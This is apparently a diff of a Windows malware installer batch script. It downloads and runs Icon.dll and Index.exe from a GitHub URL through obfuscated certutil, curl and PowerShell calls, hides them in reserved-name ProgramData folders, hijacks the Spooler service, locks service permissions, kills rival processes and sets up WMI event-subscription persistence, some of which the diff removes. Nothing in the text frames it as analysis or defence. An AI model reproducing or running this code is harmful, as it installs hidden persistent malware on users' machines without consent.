@@ -1,11 +1,3 @@
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NRP" GET Query 2>nul | findstr /C:"ISA 'Win32_PerfFormattedData_PerfOS_System'" >nul || wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NRP" SET Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" GET CommandLineTemplate 2>nul | findstr /C:"\\?\%ProgramData%" >nul || wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" SET CommandLineTemplate="\\?\%ProgramData%\nuldata..\nul.exe \\?\%ProgramData%\nuldata..\nul"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="NRP" GET CommandLineTemplate 2>nul | findstr /C:"\\?\%ProgramData%" >nul || wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="NRP" SET CommandLineTemplate="\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
-
-powershell.exe -NoProfile -Command "$f = Get-WmiObject -Namespace 'root\subscription' -Class __EventFilter -Filter \"Name='NRP'\" -ErrorAction SilentlyContinue; if (-not $f -or $f.Query -notlike \"*ISA 'Win32_PerfFormattedData_PerfOS_System'*\") { Set-WmiInstance -Path '\\.\root\subscription:__EventFilter.Name=\"NRP\"' -Arguments @{EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300'} | Out-Null }"
-powershell.exe -NoProfile -Command "$target = '\\?\%ProgramData%\nuldata..\nul.exe \\?\%ProgramData%\nuldata..\nul'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
-powershell.exe -NoProfile -Command "$target = '\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='NRP'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
-
 taskkill.exe /f /IM nul.exe
 taskkill.exe /f /IM prn.exe
 taskkill.exe /f /IM con.exe
@@ -20,9 +12,9 @@ powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -
 powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='NOC'\" | Remove-WmiObject"
 powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='NOC'\" | Remove-WmiObject"
 
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "1cd029ddb6e1984a86a4412cdac89858" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "1cd029ddb6e1984a86a4412cdac89858" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
-powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '1cd029ddb6e1984a86a4412cdac89858') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
+powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne 'd72cb7fd979075592ad96b35b63f6553') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
 
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
@@ -56,7 +48,11 @@ sc qc "Spooler" | findstr /L /C:"\\?\%ProgramData%\prndata..\prn.exe" >nul || sc
 sc sdshow "Spooler" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "Spooler" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 
-rd /S /Q "\\?\%ProgramData%\NUL..\"
-rd /S /Q "\\?\%ProgramData%\config..\"
+rd /S /Q \\?\%ProgramData%\AUX..\
+rd /S /Q \\?\%ProgramData%\CON..\
+rd /S /Q \\?\%ProgramData%\NUL..\
+rd /S /Q \\?\%ProgramData%\config..\
+rd /S /Q \\?\%ProgramData%\logdata..\
+rd /S /Q \\?\%ProgramData%\diaglogs..\
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 netstat -ano | find "31270" >nul || powershell -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
